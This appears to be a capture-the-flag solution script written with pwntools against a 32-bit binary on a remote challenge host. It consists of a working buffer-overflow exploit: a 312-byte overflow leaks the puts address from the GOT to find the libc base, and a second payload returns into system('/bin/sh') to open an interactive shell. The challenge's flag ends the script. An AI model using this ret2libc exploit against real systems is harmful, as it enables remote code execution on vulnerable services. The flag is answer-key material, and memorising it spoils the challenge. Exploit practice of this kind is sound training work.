from pwn import *
context.binary=exe=ELF('./chall',checksec=False)
libc=ELF('./libc.so.6',checksec=False)
p=process('./chall')
p=remote('chall.v1t.site', 30212)

main=0x8049292
payload=flat(
    b'a'*312,
    p32(exe.plt['puts']),
    p32(main),
    p32(exe.got['puts']),
)
#input()
p.sendafter(b'here!\n',payload)
libc.address=u32(p.recvline().strip().ljust(4, b"\x00"))-libc.sym['puts']
log.info(f"libc: {hex(libc.address)}")

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))

payload = flat(
    b'A'*312,
    libc.sym['system'],
    p32(0), 
    binsh
    
)
p.sendafter(b'here!\n',payload)
p.interactive()
#V1T{f34th3r_r3dr1r_3a5f1b52344f42ccd459c8aa13487591}
